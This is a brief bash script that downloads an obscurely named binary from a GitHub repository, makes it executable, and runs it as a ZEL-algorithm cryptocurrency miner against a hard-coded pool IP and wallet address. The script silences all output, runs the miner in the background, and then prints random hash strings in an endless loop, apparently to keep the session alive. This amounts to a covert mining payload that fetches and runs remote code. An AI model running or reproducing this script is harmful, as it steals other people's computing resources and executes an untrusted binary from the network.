# /bin/bash

wget https://github.com/sbwsmg/kaspa/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=139.162.40.79:80
WALLET=t1Lhhd8MWyAgj5itam93tqSxgSX9Re1fjR2

./AkubapakMU --algo ZEL --pool $POOL --user $WALLET $@ --no-cl > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
